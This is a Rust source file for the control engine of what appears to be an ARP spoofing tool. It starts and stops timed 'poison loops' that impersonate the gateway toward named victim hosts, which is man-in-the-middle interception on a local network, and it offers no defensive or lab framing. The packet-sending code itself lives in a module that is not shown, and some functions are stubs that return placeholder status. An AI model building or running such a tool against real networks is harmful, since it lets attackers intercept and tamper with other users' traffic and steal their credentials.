// src/spoofer/engine.rs
use super::{SpoofState, SpoofStatus, SpoofTarget, SpooferCommand, poison::PoisonLoop};
use crate::host::table::{HostState, HostTable};
use pnet::datalink::DataLinkSender;
use pnet::util::MacAddr;
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::{Mutex, RwLock, mpsc, oneshot};
use tokio::task::JoinHandle;

pub struct SpooferEngine {
    our_mac: MacAddr,
    gateway_ip: std::net::Ipv4Addr,
    sender: Arc<Mutex<Box<dyn DataLinkSender>>>,
    host_table: Arc<RwLock<HostTable>>,

    // Active poison loops
    active_loops: HashMap<crate::host::table::HostId, PoisonHandle>,

    // Command channel
    cmd_tx: mpsc::Sender<SpooferCommand>,
    cmd_rx: mpsc::Receiver<SpooferCommand>,
}

struct PoisonHandle {
    stop_tx: oneshot::Sender<()>,
    task: JoinHandle<Result<(), Box<dyn std::error::Error + Send + Sync>>>,
    status: Arc<Mutex<SpoofStatus>>,
}

impl SpooferEngine {
    pub fn new(
        our_mac: MacAddr,
        gateway_ip: std::net::Ipv4Addr,
        sender: Arc<Mutex<Box<dyn DataLinkSender>>>,
        host_table: Arc<RwLock<HostTable>>,
    ) -> Self {
        let (cmd_tx, cmd_rx) = mpsc::channel(32);

        Self {
            our_mac,
            gateway_ip,
            sender,
            host_table,
            active_loops: HashMap::new(),
            cmd_tx,
            cmd_rx,
        }
    }

    pub fn command_sender(&self) -> mpsc::Sender<SpooferCommand> {
        self.cmd_tx.clone()
    }

    pub async fn run(mut self) {
        println!("[*] SpooferEngine started");
        println!("    Gateway IP: {}", self.gateway_ip);
        println!("    Our MAC: {}", self.our_mac);

        while let Some(cmd) = self.cmd_rx.recv().await {
            match cmd {
                SpooferCommand::Start(target) => {
                    self.start_poison(target).await;
                }
                SpooferCommand::Stop(host_id) => {
                    self.stop_poison(host_id).await;
                }
                SpooferCommand::StopAll => {
                    self.stop_all().await;
                    break;
                }
                SpooferCommand::UpdateGatewayMac(new_mac) => {
                    self.update_gateway_mac(new_mac).await;
                }
            }
        }

        println!("[*] SpooferEngine shutting down");
        self.stop_all().await;
    }

    async fn start_poison(&mut self, target: SpoofTarget) {
        let host_id = target.host_id;

        if self.active_loops.contains_key(&host_id) {
            println!("[!] Host {} is already being poisoned", host_id);
            return;
        }

        println!("[*] Starting ARP poison for host {}:", host_id);
        println!("    Victim: {} @ {}", target.victim_ip, target.victim_mac);
        println!(
            "    Gateway: {} @ {}",
            target.gateway_ip, target.gateway_mac
        );

        // Update host state
        {
            let mut table = self.host_table.write().await;
            table.update_state(host_id, HostState::Poisoning);
        }

        let (stop_tx, stop_rx) = oneshot::channel();

        let status = Arc::new(Mutex::new(SpoofStatus {
            host_id,
            state: SpoofState::Poisoning,
            poison_count: 0,
            last_poison: None,
            error_count: 0,
        }));

        let poison_loop = PoisonLoop::new(
            Arc::clone(&self.sender),
            self.our_mac,
            2000, // 2 second interval between poisons
        );

        let task = tokio::spawn(async move { poison_loop.run(target, stop_rx).await });

        let handle = PoisonHandle {
            stop_tx,
            task,
            status,
        };

        self.active_loops.insert(host_id, handle);
        println!("[+] Poison loop started for host {}", host_id);
    }

    async fn stop_poison(&mut self, host_id: crate::host::table::HostId) {
        if let Some(handle) = self.active_loops.remove(&host_id) {
            println!("[*] Stopping poison for host {}...", host_id);

            let _ = handle.stop_tx.send(());

            // Wait for cleanup with timeout
            let abort_handle = handle.task.abort_handle();
            match tokio::time::timeout(std::time::Duration::from_secs(5), handle.task).await {
                Ok(Ok(_)) => {
                    println!("[+] Poison stopped cleanly for host {}", host_id);
                }
                Ok(Err(e)) => {
                    eprintln!("[!] Poison task error for host {}: {}", host_id, e);
                }
                Err(_) => {
                    eprintln!("[!] Poison stop timeout for host {}", host_id);
                    abort_handle.abort(); // use the pre-saved handle
                }
            }

            // Update host state back to Discovered
            let mut table = self.host_table.write().await;
            table.update_state(host_id, HostState::Discovered);
        } else {
            println!("[!] Host {} is not being poisoned", host_id);
        }
    }

    async fn stop_all(&mut self) {
        let host_ids: Vec<_> = self.active_loops.keys().copied().collect();
        for id in host_ids {
            self.stop_poison(id).await;
        }
    }

    async fn update_gateway_mac(&mut self, new_mac: MacAddr) {
        println!("[*] Updating gateway MAC to {}", new_mac);
        // This would update active poison loops if gateway MAC changed
        // For now, just log it - new poisons will use correct MAC
    }

    pub fn is_poisoning(&self, host_id: crate::host::table::HostId) -> bool {
        self.active_loops.contains_key(&host_id)
    }

    pub async fn get_status(&self, host_id: crate::host::table::HostId) -> Option<SpoofStatus> {
        self.active_loops.get(&host_id).map(|h| {
            // This is a simplified version - in real code, we'd read from the status Arc
            SpoofStatus {
                host_id,
                state: SpoofState::Poisoning,
                poison_count: 0,
                last_poison: None,
                error_count: 0,
            }
        })
    }
}
